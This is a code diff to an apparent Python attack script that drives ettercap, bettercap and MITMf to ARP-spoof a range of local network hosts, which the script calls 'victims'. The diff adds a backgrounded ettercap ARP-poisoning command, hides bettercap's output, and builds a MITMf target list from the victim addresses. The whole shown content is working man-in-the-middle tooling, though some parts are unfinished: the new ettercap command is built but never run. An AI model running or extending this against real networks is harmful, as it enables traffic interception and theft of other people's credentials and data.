@@ -25,8 +25,10 @@ def wait_all_victims(packet):
 		exit()
 	
 def ettercap():
-	# TODO
-	pass
+	cmd = """
+	ettercap -Tq -M arp:remote /192.168.1.{}-{}// > /dev/null 2> /dev/null &
+	""".format(*IP_RANGE)
+
 
 def bettercap():
 	cmd = """
@@ -34,18 +36,22 @@ def bettercap():
 		net.probe on
 		set arp.spoof.targets 192.168.1.{}-{}
 		arp.spoof on
-		'
+		' > /dev/null 2> /dev/null & 
 	""".format(*IP_RANGE)
 	os.system(cmd)
 	
 def mitmf():
+	targets = ""
+	for v in victims:
+		targets += v + ',' 
+	targets = targets.rstrip(',')
 	cmd = """
 	python mitmf -i eth0
 		--spoof
 		--arp
-		--target 192.168.0.{}-{},192.168.0.1/24
+		--target {},
 		--gateway {}
-	""".format(*IP_RANGE, GATEWAY_ADDRESS)
+	""".format(targets, GATEWAY_ADDRESS)
 	os.system(cmd)
 
 def dsniff():
